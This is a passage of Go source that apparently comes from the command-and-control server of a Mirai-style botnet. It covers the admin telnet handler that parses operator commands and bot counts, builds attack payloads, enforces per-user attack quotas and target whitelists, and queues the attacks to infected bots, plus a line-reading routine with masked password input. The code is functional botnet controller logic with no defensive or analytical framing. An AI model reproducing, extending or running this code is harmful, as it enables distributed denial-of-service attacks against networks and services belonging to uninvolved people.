                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37m%s: \x1b[0;31m%d\033[0m\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37mtotal.botcount: \x1b[0;31m%d\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
